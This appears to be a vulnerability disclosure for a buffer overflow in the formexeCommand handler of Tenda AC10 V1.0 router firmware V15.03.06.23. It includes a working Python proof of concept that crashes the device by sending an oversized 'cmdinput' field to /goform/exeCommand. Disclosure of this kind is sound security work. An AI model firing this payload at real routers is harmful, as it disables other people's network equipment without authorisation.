
### Overview

*   Equipment website：[https://www.tenda.com.cn](https://www.tenda.com.cn/product/AX1806.html)
*   Firmware download website：[AC10V1.0升级软件](https://www.tenda.com.cn/material/show/102734)

### Affected version

V1.0 V15.03.06.23

### Vulnerability details
TenDa   AC10 V1.0 V15.03.06.23 firmware has a buffer overflow vulnerability in the formexeCommand function
A buffer overflow vulnerability exists in TenDa AC10 V1.0 V15.03.06.23 firmware feature. This function copies the contents of the string to cmd_buf without performing a boundary check. Therefore, if the length is longer than 512 bytes, it can cause a buffer overflow, overwriting the memory area behind the array, which can cause the program to crash and trigger this security vulnerability.
![image](https://github.com/user-attachments/assets/dda9f1d2-f132-4bab-9068-84854f087cf4)


### poc
```
import requests
ip = "192.168.142.100"
url = "http://" + ip + "/goform/exeCommand"
payload = b"Raining"*3000

data = {"cmdinput": payload}
response = requests.post(url, data=data)
print(response.text)
```
![image](https://github.com/user-attachments/assets/a43542ae-85a0-424e-afee-762c8e7e8519)




